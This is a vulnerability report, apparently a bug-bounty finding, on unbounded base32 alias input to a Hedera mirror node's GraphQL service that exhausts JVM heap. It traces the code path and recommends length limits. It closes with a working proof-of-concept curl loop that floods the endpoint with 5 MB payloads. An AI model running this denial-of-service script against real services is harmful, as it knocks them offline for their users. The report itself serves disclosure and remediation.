### Title
Missing Length Constraint on Base32 Alias Input Enables Memory Exhaustion DoS

### Summary
The GraphQL `AccountInput.alias` field is validated only for character set (`^[A-Z2-7]+$`) with no maximum length constraint. An unauthenticated attacker can submit an arbitrarily large valid base32 string, causing `decodeBase32()` to allocate a proportionally large byte array on the JVM heap. Repeated or concurrent requests can exhaust heap memory and crash the mirror node GraphQL service.

### Finding Description
In `graphql/src/main/resources/graphql/account.graphqls` line 90, the `alias` field is declared as:
```graphql
alias: String @Pattern(regexp: "^[A-Z2-7]+$")
``` [1](#0-0) 

This `@Pattern` directive enforces only that characters belong to the base32 alphabet. There is no `@Size(max=...)` or equivalent constraint. The `@Valid` annotation in `AccountController.java` triggers bean validation, but only the pattern check fires. [2](#0-1) 

When `alias != null`, control flows to `EntityServiceImpl.getByAliasAndType()`: [3](#0-2) 

Which calls `decodeBase32(alias)`: [4](#0-3) 

`BASE32.decode()` from Apache Commons Codec allocates a `byte[]` of approximately `(inputLength * 5) / 8` bytes. A 10 MB alias string (all valid `A-Z2-7` chars) causes ~6.25 MB allocation per request. There is no length check anywhere in this call chain.

By contrast, the `rest-java` module correctly limits alias length to 40–70 characters via its regex: [5](#0-4) 

The GraphQL module has no equivalent guard.

### Impact Explanation
An attacker can crash the mirror node's GraphQL service by exhausting JVM heap memory. The mirror node is a read-only service and does not directly confirm Hedera network transactions, so the "total network shutdown" framing is overstated. However, the GraphQL endpoint becomes unavailable, denying service to all consumers of that API. The impact is a Denial of Service against the mirror node GraphQL service.

### Likelihood Explanation
The GraphQL endpoint is publicly accessible with no authentication required. The exploit requires only a standard HTTP client. The attacker needs no credentials, no special knowledge, and no prior access. The attack is trivially repeatable and scriptable. Default Spring Boot / Netty HTTP request size limits (typically 256 KB–2 MB) reduce the per-request allocation, but concurrent requests or chunked payloads can still exhaust heap. The attack is highly feasible.

### Recommendation
Add a maximum length constraint on the `alias` field in the GraphQL schema, consistent with the `rest-java` module's 40–70 character limit:
```graphql
alias: String @Pattern(regexp: "^[A-Z2-7]+$") @Size(max: 70)
```
Additionally, add a defensive length check inside `decodeBase32()` or `getByAliasAndType()`:
```java
if (alias != null && alias.length() > 70) {
    throw new IllegalArgumentException("Alias exceeds maximum allowed length");
}
```

### Proof of Concept
```bash
# Generate a 5MB valid base32 alias string (all 'A' chars, valid base32 alphabet)
ALIAS=$(python3 -c "print('A' * 5_000_000)")

# Send to the GraphQL endpoint
curl -X POST http://<mirror-node-host>/graphql/alpha \
  -H 'Content-Type: application/json' \
  -d "{\"query\": \"{ account(input: { alias: \\\"$ALIAS\\\" }) { entityId { num } } }\"}"

# Repeat concurrently to exhaust heap:
for i in $(seq 1 50); do
  curl -s -X POST http://<mirror-node-host>/graphql/alpha \
    -H 'Content-Type: application/json' \
    -d "{\"query\": \"{ account(input: { alias: \\\"$ALIAS\\\" }) { entityId { num } } }\"}" &
done
wait
```
Each request passes the `@Pattern` check (all `A` chars are valid base32), reaches `BASE32.decode()`, and allocates ~3.1 MB. Fifty concurrent requests allocate ~155 MB in addition to normal heap usage, triggering `OutOfMemoryError` and crashing the service.
